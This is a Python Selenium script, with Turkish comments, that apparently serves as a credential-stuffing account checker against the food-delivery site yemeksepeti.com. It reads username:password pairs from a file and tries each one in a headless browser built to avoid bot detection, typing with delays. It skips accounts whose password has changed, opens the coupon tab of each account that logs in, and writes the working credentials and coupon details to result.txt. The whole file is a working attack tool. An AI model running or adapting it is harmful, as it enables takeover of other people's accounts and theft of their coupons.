import time
import undetected_chromedriver.v2 as uc
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import StaleElementReferenceException

def send_delayed_keys(element, text, delay): #text yazarken yavaşlatma fonksiyonu
    for character in text:
        element.send_keys(character)
        time.sleep(delay)

username_password_list = list()
with open("acc.txt") as file:
    for line in file:
       user, password = line.split(':')
       username_password_list.append((user, password))
for user, password in username_password_list:
    #define what browser
    options = uc.ChromeOptions() 
    options.add_argument("--headless")
    driver = uc.Chrome(options=options)

    url="https://www.yemeksepeti.com/antalya"

    driver.get(url)
    time.sleep(1)
    eposta=driver.find_element_by_xpath('//*[@id="UserName"]')
    
    sifre=driver.find_element_by_xpath('//*[@id="password"]')
    
    send_delayed_keys(eposta,user,0.01)
    time.sleep(1)
    send_delayed_keys(sifre,password,0.01)
    giris=driver.find_element_by_xpath('//*[@id="ys-fastlogin-button"]')
    try:
        driver.execute_script("arguments[0].click();", giris)
    except StaleElementReferenceException:
        pass

    
    time.sleep(4)
    try:#hesap şifresi değiştirildiyse diğer hesaba geçiyor.
        a=driver.find_element_by_xpath('/html/body/div[13]/div/div/div/div[2]/div/a[2]/div[3]/button')
        driver.execute_script("arguments[0].click();", a)
        time.sleep(3)
        b=driver.find_element_by_xpath('//*[@id="user-info"]/div[2]/div')
        driver.execute_script("arguments[0].click();", b)
        time.sleep(3)
        try:#kuponu bulup bulmazsa yazıyor.
            kuponsekmesi=driver.find_element_by_class_name("myCoupons")
            driver.execute_script("arguments[0].click();", kuponsekmesi)
            time.sleep(3)
            
            results=driver.find_element_by_xpath('//*[@id="cboxLoadedContent"]/div/div/ul/li/div[2]/b').text
            time.sleep(1)
            print(results)
            l= str(user) +":"+str(password)+ results + "    var \n\n"
    
            with open('result.txt', "a", encoding='utf-8') as fhandle:
                fhandle.write(l)

            driver.close()

        except StaleElementReferenceException: 
            driver.close()
            continue

    except NoSuchElementException:
        
        driver.close()
        continue
